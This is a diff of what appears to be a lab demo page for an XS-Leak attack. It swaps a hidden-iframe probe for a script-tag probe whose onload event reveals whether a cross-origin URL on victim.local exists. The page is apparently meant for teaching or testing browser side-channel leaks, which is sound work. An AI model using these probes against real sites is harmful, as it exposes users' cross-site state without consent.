@@ -6,20 +6,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>XS-Leak Attack - Error Events</title>
     <script>
-        function probeError(url) {
-            // Remove any existing iframe first
-            const existingIframe = document.getElementById('probeIframe');
-            if (existingIframe) {
-                document.body.removeChild(existingIframe);
+        function testExploit(url) {
+            // Create and append an iframe
+            const script = document.createElement('script');
+            script.src = url;
+
+            script.onload = () => {
+                console.log("Attempt to load data from\n '" + url + "' \nwas successful.");
             }
 
-            // Create and append an iframe
-            let iframe = document.createElement('iframe');
-            iframe.id = 'probeIframe';
-            iframe.src = url;
-            iframe.style.display = 'none'; // Hide the iframe
-
-            document.body.appendChild(iframe);
+            document.body.appendChild(script);
         }
     </script>
 </head>
@@ -43,13 +39,13 @@
     <h3>Existing Webpage</h3>
     <p>This will check whether <a href="http://victim.local:8080/xs-leaks/error-events.html">this</a> webpage is available (it is).</p>
     <p>
-        <button onclick="probeError('http\:\/\/victim.local:8080/xs-leaks/error-events.html')">Test Existing Page (Success)</button>
+        <button onclick="testExploit('http\:\/\/victim.local:8080/xs-leaks/error-events.html')">Test Existing Page (Success)</button>
     </p>
 
     <h3>Non-Existing Webpage</h3>
     <p>This will check whether <a href="http://victim.local:8080/xs-leaks/404">this</a> webpage is available (it is not).</p>
     <p>
-        <button onclick="probeError('http\:\/\/victim.local:8080/xs-leaks/404')">Test Non-Existing Page (Failure)</button>
+        <button onclick="testExploit('http\:\/\/victim.local:8080/xs-leaks/404')">Test Non-Existing Page (Failure)</button>
     </p>
 
     <div id="message"></div>
